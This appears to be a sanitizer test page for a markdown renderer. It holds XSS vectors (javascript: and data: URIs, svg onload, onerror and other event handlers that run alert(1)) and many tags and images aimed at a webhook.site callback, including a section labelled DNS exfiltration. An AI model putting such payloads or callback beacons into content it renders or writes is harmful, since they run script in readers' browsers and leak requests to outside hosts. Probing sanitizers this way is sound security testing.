# Security Research - v35

## Deep Nesting & Edge Case Testing

Testing nested elements, Unicode attributes, and other edge cases.

---

### 1) Deep KBD Nesting (10 levels)

<kbd><kbd><kbd><kbd><kbd><kbd><kbd><kbd><kbd><kbd>
Deeply nested content - does this break anything?
</kbd></kbd></kbd></kbd></kbd></kbd></kbd></kbd></kbd></kbd>

---

### 2) Deep DIV Nesting (15 levels)

<div><div><div><div><div><div><div><div><div><div><div><div><div><div><div>
Very deeply nested div content
</div></div></div></div></div></div></div></div></div></div></div></div></div></div></div>

---

### 3) Mixed Deep Nesting

<div><kbd><table><tr><td><div><kbd><table><tr><td>
Mixed nesting
</td></tr></table></kbd></div></td></tr></table></kbd></div>

---

### 4) Unicode in ID Attribute

<h4 id="❤️🔥✨">Unicode Emoji ID</h4>

[Link to emoji ID](#❤️🔥✨)

<h4 id="<script>">Script in ID</h4>

[Link to script ID](#<script>)

---

### 5) Very Long ID

<h4 id="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">Very Long ID Test</h4>

---

### 6) HTML Entities in Links

<a href="javascript&#58;alert(1)">JS Entity Test 1</a>

<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">JS Entity Test 2</a>

<a href="data&#58;text/html,<script>alert(1)</script>">Data Entity Test</a>

---

### 7) Multiple Images Same URL

![img1](https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/multi-1.gif)
![img2](https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/multi-1.gif)
![img3](https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/multi-1.gif)
![img4](https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/multi-1.gif)
![img5](https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/multi-1.gif)

---

### 8) Object/Embed Tags (should be stripped)

<object data="https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/object.swf"></object>

<embed src="https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/embed.swf">

---

### 9) SVG Tag (should be stripped)

<svg onload="alert(1)">
  <image href="https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/svg-image.gif"></image>
</svg>

---

### 10) Video/Audio Tags (should be stripped)

<video src="https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/video.mp4"></video>

<audio src="https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/audio.mp3"></audio>

---

### 11) Form Elements (should be stripped)

<form action="https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/form">
<input type="text" name="test">
<button type="submit">Submit</button>
</form>

---

### 12) Meta/Link Tags (should be stripped)

<meta http-equiv="refresh" content="0;url=https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/meta-refresh">

<link rel="stylesheet" href="https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/style.css">

---

### 13) Base Tag (should be stripped)

<base href="https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/">

---

### 14) IFrame (should be stripped)

<iframe src="https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/iframe.html"></iframe>

---

### 15) Event Handlers (should be stripped)

<div onclick="alert(1)">Click me onclick</div>

<img src="x" onerror="alert(1)">

<body onload="alert(1)">

<svg/onload="alert(1)">

<input onfocus="alert(1)" autofocus>

---

### 16) Markdown Image with Event Handler

![test](https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/md-img.gif "onerror=alert(1)")

---

### 17) Link with Data URI

[Data URI Link](data:text/html,<script>alert(1)</script>)

[Data Image](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)

---

### DNS Exfil

![dns](https://v35-dns.503e9388-e477-46a6-8a58-3a627c4fdb86.dnshook.site/dns.gif)

### Canary

![canary](https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/v35-canary.gif)

---

*v35 - Deep nesting & edge case testing*
